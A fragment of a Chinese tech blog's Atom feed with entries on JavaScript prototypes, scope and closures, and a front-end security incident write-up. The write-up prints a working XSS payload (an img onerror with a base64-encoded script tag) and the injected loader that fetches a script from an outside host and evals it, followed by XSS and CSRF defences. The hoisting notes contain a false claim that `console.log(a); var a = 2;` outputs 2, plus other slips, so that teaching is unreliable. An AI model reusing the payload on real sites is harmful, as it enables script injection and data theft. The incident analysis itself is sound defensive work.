title="实例与原型"></a>实例与原型</h2><p>当我们读取<strong>对象</strong>属性时，若我们读取的对象不存在，将会自动到对象的<strong>原型</strong>上查找属性是否存在，如果属性不存在将会到<strong>原型的原型</strong>上查找，一直会找到null为止</p><p>通过🌰我们来进行说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.name = &apos;Kevin&apos;;</span><br><span class="line"></span><br><span class="line">var person = new Person();</span><br><span class="line"></span><br><span class="line">person.name = &apos;Daisy&apos;;</span><br><span class="line">console.log(person.name) // Daisy</span><br><span class="line"></span><br><span class="line">delete person.name;</span><br><span class="line">console.log(person.name) // Kevin</span><br></pre></td></tr></table></figure><p>第一次log输出时我们得到了预期输出<code>Daisy</code>,随后我们通过<code>delete</code>关键词删除了person实例上的<code>name</code>属性，第二次输出是通过查询发现person实例中并不存在属性<code>name</code>，到<code>person</code>实例的原型<code>Person.prototype</code>上进行查找找到<code>name</code>属性，查询终止。</p><p>若<code>Person.prototype</code>上任然不存在<code>name</code>属性呢，将会从何处进行查询?</p><h2 id="原型的原型"><a href="#原型的原型" class="headerlink" title="原型的原型"></a>原型的原型</h2><p>从<code>实例</code>与<code>实例原型</code>的关系里面可以知道，通过<code>__proto__</code>属性我们可以查询到期原型，那么原型的原型是什么呢?</p><p>通过这个🌰我们可以很清晰的知道，构造函数的原型的原型是<code>Object.prototype</code>,<code>Object.prototype</code>的原型是<code>null</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;&#125;</span><br><span class="line">Person.prototype.__proto__ === Object.prototype // true</span><br><span class="line">Object.prototype.__proto__ === null // true</span><br></pre></td></tr></table></figure><p>通过上述的知识点我们可以构建成一幅完整的关系：</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_7cebll7hhc7ea3jfe102f2g4fj4fa_836x772.png" alt=""></p><p>其中<strong>青色</strong><code>__proto__</code>的线路就是我们通常所说的原型链</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://github.com/getify/You-Dont-Know-JS/blob/1ed-zh-CN/this%20%26%20object%20prototypes/ch5.md" target="_blank" rel="noopener">you don’t know js: this &amp; prototype</a></li><li><a href="https://github.com/mqyqingfeng/Blog/issues/2" target="_blank" rel="noopener">JavaScript深入之从原型到原型链</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在JavaScript语言中实际上并不存在“类”，那么它是如何实现&lt;strong&gt;继承&lt;/strong&gt;、&lt;strong&gt;多态&lt;/strong&gt;、&lt;strong&gt;实例化&lt;/strong&gt;等特性呢。它采用了与类不同的另一种技术，将其称之为&lt;strong&gt;原型&lt;/strong&gt;，并通过&lt;strong&gt;原型链&lt;/strong&gt;来实现&lt;strong&gt;继承&lt;/strong&gt;、&lt;strong&gt;多态&lt;/strong&gt;等特性。&lt;/p&gt;
&lt;p&gt;但是需要注意的是JavaScript的&lt;strong&gt;继承&lt;/strong&gt;,与Java的继承实际上有很大的区别，在Java语言中，&lt;strong&gt;继承&lt;/strong&gt;是一个&lt;strong&gt;拷贝过程&lt;/strong&gt;在物理地址上发生了拷贝，而JavaScript语言是通过&lt;strong&gt;原型链&lt;/strong&gt;将其”链接”在一起，没有发生实际的拷贝。&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>前端安全与防范</title>
    <link href="http://zhoushaw.github.io/2019/04/16/learning/font-end/security/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E8%8C%83/"/>
    <id>http://zhoushaw.github.io/2019/04/16/learning/font-end/security/前端安全与防范/</id>
    <published>2019-04-16T01:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天主站遭受了xss攻击，起因是一个普通用户发表了一个穿搭，后端接收到异常警报排查后发现用户的穿搭的<strong>描述</strong>中带有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;body/hidden&gt;&lt;img src=x onerror=document[&apos;write&apos;](atob(&apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&apos;))&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>因为穿搭look中带有格式化后html的描述内容，所以直接通过<strong>v-html</strong>指令输出了描述内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-if=&quot;from === &apos;detail&apos;&quot; v-html=&quot;content&quot; ref=&quot;content&quot; style=&quot;-webkit-user-select: text&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这个时候攻击的html标签将会直接被注入到页面中，这里还涉及到另外一个知识点：</p><ul><li>btoa（base64加密）</li><li>atob （base64解密）</li></ul><div><a id="more"></a></div><p>经过<code>atob</code>解密后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">atob(&apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&apos;)</span><br><span class="line"></span><br><span class="line">// 转变成</span><br><span class="line"></span><br><span class="line">&lt;body/hidden&gt;&lt;script src=https://s5.mogucdn.com/mlcdn/c45406/190415_63j65lek4d22g86c5hb7ka98l9ffe&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// 一般攻击者都不会将，body隐藏。而是直接通过盗用信息</span><br></pre></td></tr></table></figure><p>通过<code>document[&#39;write&#39;]</code>将dom写入页面后，通过<code>mogucdn</code>资源将会下载脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var ua = navigator.userAgent.toLowerCase();</span><br><span class="line"></span><br><span class="line">// 在微信环境下，将会通过ajax请求获取站外脚本，获取完成后通过eval动态执行</span><br><span class="line">if (/micromessenger/.test(ua)) &#123;</span><br><span class="line">    $.get(&apos;https://api.ruanwin.com/j&apos;,function(d) &#123;</span><br><span class="line">        window[&apos;ev&apos; + &apos;al&apos;](d);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>所幸精选穿搭必须由产品手动审核，该look并不会进入首页，否则至少将造成P1级故障</strong></p><h2 id="安全于防范"><a href="#安全于防范" class="headerlink" title="安全于防范"></a>安全于防范</h2><blockquote><p>常见攻击手段</p></blockquote><ul><li><p>XSS</p><ul><li>跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</li></ul></li><li><p>CSRF</p><ul><li>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li></ul></li></ul><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><blockquote><p>XSS防范</p></blockquote><p>在前言中的案例，就是<code>XSS</code>攻击的典范。我们如何避免被<code>XSS</code>攻击呢，可以从以下几方面入手：</p><ul><li>输入过滤<ul><li><blockquote><p>符号转译成<code>&amp;lt;</code>等符号</p></blockquote></li></ul></li><li>内容输出<ul><li>含有<code>html</code>输出内容，对 HTML 做安全过滤。下文将详细介绍如果进行安全过滤设计</li><li>禁止使用：<code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code></li><li><strong>Vue</strong>/<strong>React</strong> 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code></li><li>过滤库<a href="https://github.com/leizongmin/js-xss" target="_blank" rel="noopener">js-xss</a></li></ul></li><li>使用CSP，限制非白名单脚本加载<ul><li>http请求头添加：Content-Security-Policy</li><li>参考：<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">csp防范添加</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天主站遭受了xss攻击，起因是一个普通用户发表了一个穿搭，后端接收到异常警报排查后发现用户的穿搭的&lt;strong&gt;描述&lt;/strong&gt;中带有:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p&amp;gt;&amp;lt;body/hidden&amp;gt;&amp;lt;img src=x onerror=document[&amp;apos;write&amp;apos;](atob(&amp;apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&amp;apos;))&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为穿搭look中带有格式化后html的描述内容，所以直接通过&lt;strong&gt;v-html&lt;/strong&gt;指令输出了描述内容：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;div v-if=&amp;quot;from === &amp;apos;detail&amp;apos;&amp;quot; v-html=&amp;quot;content&amp;quot; ref=&amp;quot;content&amp;quot; style=&amp;quot;-webkit-user-select: text&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个时候攻击的html标签将会直接被注入到页面中，这里还涉及到另外一个知识点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;btoa（base64加密）&lt;/li&gt;
&lt;li&gt;atob （base64解密）&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="security" scheme="http://zhoushaw.github.io/categories/security/"/>
    
    
      <category term="security" scheme="http://zhoushaw.github.io/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>scope &amp; closures</title>
    <link href="http://zhoushaw.github.io/2019/04/05/learning/book-notes/scope&amp;closures/"/>
    <id>http://zhoushaw.github.io/2019/04/05/learning/book-notes/scope&amp;closures/</id>
    <published>2019-04-04T20:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.661Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p>本文是you don’t know js系列的 <a href="https://github.com/getify/You-Dont-Know-JS/tree/1ed-zh-CN/scope%20%26%20closures" target="_blank" rel="noopener">作用域与闭包</a> 笔记</p><h2 id="一、作用域"><a href="#一、作用域" class="headerlink" title="一、作用域"></a>一、作用域</h2><h3 id="什么是作用域"><a href="#什么是作用域" class="headerlink" title="什么是作用域"></a>什么是作用域</h3><p>几乎所有计算机语言都提供了最基础的变量模型，变量它允许人们将值存入变量中，并且再后续从变量中取值或修改值。</p><p>但是变量的存储同样会带来几个问题，我们如何存储数据到变量上，又如何查找变量的值。这样的一些列规则我们将其称之为作用域</p><p><div><a id="more"></a></div></p><h3 id="理解作用域"><a href="#理解作用域" class="headerlink" title="理解作用域"></a>理解作用域</h3><p>如何正确的理解作用域呢，为了方便理解可以简单的将JavaScript程序运行时分成三大部分：</p><ul><li>引擎：负责从始至终的编译和执行我们的 JavaScript 程序。</li><li>编译器：引擎 的朋友之一；处理所有的解析和代码生成的重活儿</li><li>作用域：引擎 的另一个朋友；收集并维护一张所有被声明的标识符（变量）的列表，并对当前执行中的代码如何访问这些变量强制实施一组严格的规则。</li></ul><p>让我们来分析引擎是如何处理<code>var a = 2;</code>这样的一个语句的吧，首先一个合理的假设是：为一个变量分配一个内存，并将其标记成a。然后将2赋值到变量a中。不幸的是，这并不是十分精准的</p><p>编译器会这样处理：</p><ul><li>编译器首先会进行词法分析，将<code>var a = 2;</code>字符串打断成有意义的片段也称之为token，这段程序有可能会被打断成<code>var</code>、<code>a</code>、<code>=</code>、<code>2</code>和<code>=</code></li><li>将一个 token 的流（数组）转换为一个嵌套元素的树，它综合地表示了程序的语法结构。</li><li>词法分析和AST(抽象语法树)转换完成后，遇到<code>var a</code>，编译器会让作用域查看是否存在当前这个特定的作用域集合，变量 <code>a</code> 是否已经存在了。如果是，编译器 就忽略这个声明并继续前进。否则，编译器 就让 作用域 去为这个作用域集合声明一个称为 a 的新变量。</li><li>然后 编译器 为 引擎 生成稍后要执行的代码，来处理赋值 a = 2。引擎 运行的代码首先让 作用域 去查看在当前的作用域集合中是否有一个称为 a 的变量可以访问。如果有，引擎 就使用这个变量。如果没有，引擎 就查看 其他地方</li></ul><blockquote><p>编译器术语</p></blockquote><p>在我们这个例子中，引擎 将会对变量 <code>a</code> 实施一个“LHS”查询。另一种类型的查询称为“RHS”。</p><p>换言之，当一个变量出现在赋值操作的左手边时，会进行 LHS 查询，当一个变量出现在赋值操作的右手边时，会进行 RHS 查询。<br>可以认为LHS 查询是试着找到变量容器本身，以便它可以赋值,“RHS”意味着“取得他/她的源（值）”，暗示着 RHS 的意思是“去取……的值<br>在概念上将它考虑为：“赋值的目标（LHS）”和“赋值的源（RHS）”</p><h3 id="嵌套的作用域"><a href="#嵌套的作用域" class="headerlink" title="嵌套的作用域"></a>嵌套的作用域</h3><p>我们说过 作用域 是通过标识符名称查询变量的一组规则。但是，通常会有多于一个的 作用域 需要考虑。</p><p>就像一个代码块儿或函数被嵌套在另一个代码块儿或函数中一样，作用域被嵌套在其他的作用域中。所以，如果在直接作用域中找不到一个变量的话，引擎 就会咨询下一个外层作用域，如此继续直到找到这个变量或者到达最外层作用域（也就是全局作用域）。</p><h3 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h3><p>有一种倾向认为你在 JavaScript 程序中看到的所有代码，在程序执行的过程中都是从上到下一行一行地被解释执行的。虽然这大致上是对的，但是这种猜测中的一个部分可能会导致你错误地考虑你的程序。</p><p class="tip">在作用域的规则中，存在“变量提升”这么一个概念。不过，需要注意的是，这个概念可能产生一点点误解 。例如，从概念的字面意义上说，“变量提升”意味着变量和函数的声明会在物理层面移动到代码的最前面，但这么说并不准确。实际上变量和函数声明在代码里的位置是不会动的，而是在编译阶段被放入内存中。</p><blockquote><p>考虑另一个代码段：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>许多开发者会期望 undefined，因为语句 var a 出现在 a = 2 之后，这很自然地看起来像是这个变量被重定义了，并因此被赋予了默认的 undefined。然而，输出将是 2。</p><blockquote><p>考虑另一个代码段：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>你可能会被诱导而这样认为：因为上一个代码段展示了一种看起来不是从上到下的行为，也许在这个代码段中，也会打印 2。另一些人认为，因为变量 a 在它被声明之前就被使用了，所以这一定会导致一个 ReferenceError 被抛出。</p><p>不幸的是，两种猜测都不正确。输出是 undefined。</p><h4 id="编译器再次袭来"><a href="#编译器再次袭来" class="headerlink" title="编译器再次袭来"></a>编译器再次袭来</h4><p>引擎 实际上将会在它解释执行你的 JavaScript 代码之前编译它。编译过程的一部分就是找到所有的声明，并将它们关联在合适的作用域上。</p><p>所以，考虑这件事情的最佳方式是，在你的代码的任何部分被执行之前，所有的声明，变量和函数，都会首先被处理。</p><p class="tip">当你看到 var a = 2; 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：var a; 和 a = 2;。第一个语句，声明，是在编译阶段被处理的。第二个语句，赋值，为了执行阶段而留在 原处。</p><p>于是我们的第一个代码段应当被认为是这样被处理的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br></pre></td></tr></table></figure><p>相似地，我们的第二个代码段实际上被处理为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"></span><br><span class="line">a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>所以，关于这种处理的一个有些隐喻的考虑方式是，变量和函数声明被从它们在代码流中出现的位置“移动”到代码的顶端。这就产生了“提升”这个名字。</p><h4 id="函数申明提升"><a href="#函数申明提升" class="headerlink" title="函数申明提升"></a>函数申明提升</h4><p class="tip">当你看到 var a = 2; 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：var a; 和 a = 2;。第一个语句，声明，是在编译阶段被处理的。第二个语句，赋值，为了执行阶段而留在 原处。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 foo 的声明（在这个例子中它还 包含 一个隐含的、实际为函数的值）被提升了，因此第一行的调用是可以执行的。</p><p class="tip">还需要注意的是，提升是 以作用域为单位的。所以虽然我们的前一个代码段被简化为仅含有全局作用域，但是我们现在检视的函数foo(..)本身展示了，var a被提升至foo(..)的顶端（很明显，不是程序的顶端）。所以这个程序也许可以更准确地解释为：</p><p>函数声明会被提升，就像我们看到的。但是函数表达式不会。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与</span></span><br><span class="line">foo(); <span class="comment">// 不是 ReferenceError， 而是 TypeError!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="函数优先"><a href="#函数优先" class="headerlink" title="函数优先"></a>函数优先</h4><p class="tip">函数声明和变量声明都会被提升。但一个微妙的细节（可以 在拥有多个“重复的”声明的代码中出现）是，函数会首先被提升，然后才是变量。</p><p>考虑这段代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1 被打印了，而不是 2！这个代码段被 引擎 解释执行为：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意那个 var foo 是一个重复（因此被无视）的声明，即便它出现在 function foo()… 声明之前，因为函数声明是在普通变量之前被提升的。</p><p>虽然多个/重复的 var 声明实质上是被忽略的，但是后续的函数声明确实会覆盖前一个。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">foo(); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">3</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、闭包"><a href="#二、闭包" class="headerlink" title="二、闭包"></a>二、闭包</h2><h3 id="什么是闭包"><a href="#什么是闭包" class="headerlink" title="什么是闭包"></a>什么是闭包</h3><p>闭包对于大多数熟练的JavaScript也算是一个模糊不清的概念，什么是闭包呢，闭包能给我们带来什么好处和坏处？</p><p class="tip">简单来说可以用一句话概括闭包的特性与作用：闭包就是函数能够记住并访问它的词法作用域，即使这个函数在它的词法作用域外执行</p><blockquote><p>让我们跳进代码来说明这个定义：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>上面的代码段被认为是函数 bar() 在函数 foo() 的作用域上有一个 闭包.换一种略有不同的说法是，bar() 闭住了 foo() 的作用域。为什么？因为 bar() 嵌套地出现在 foo() 内部。就这么简单。</p><h3 id="闭包的特性"><a href="#闭包的特性" class="headerlink" title="闭包的特性"></a>闭包的特性</h3><p>根据闭包的定义我们能很容易记住其两大特点：</p><p>1、能够记住并访问它的词法作用域<br>2、即使在它的作用域外执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baz = foo();</span><br><span class="line"></span><br><span class="line">baz(); <span class="comment">// 2 -- 哇噢，看到闭包了，伙计。</span></span><br></pre></td></tr></table></figure><ul><li>bar() 被执行了，必然的。但是在这个例子中，它是在它被声明的词法作用域 外部 被执行的。</li><li>foo() 被执行之后，一般说来我们会期望 foo() 的整个内部作用域都将消失，因为我们知道 引擎 启用了 垃圾回收器 在内存不再被使用时来回收它们。因为很显然 foo() 的内容不再被使用了，所以看起来它们很自然地应该被认为是 消失了。</li><li>但是闭包的“魔法”不会让这发生。内部的作用域实际上 依然 “在使用”，因此将不会消失。谁在使用它？函数 bar() 本身。</li><li>有赖于它被声明的位置，bar() 拥有一个词法作用域闭包覆盖着 foo() 的内部作用域，闭包为了能使 bar() 在以后任意的时刻可以引用这个作用域而保持它的存在。</li><li>bar() 依然拥有对那个作用域的引用，而这个引用称为闭包。</li></ul><h3 id="闭包使用场景"><a href="#闭包使用场景" class="headerlink" title="闭包使用场景"></a>闭包使用场景</h3><h4 id="无处不在的闭包"><a href="#无处不在的闭包" class="headerlink" title="无处不在的闭包"></a>无处不在的闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 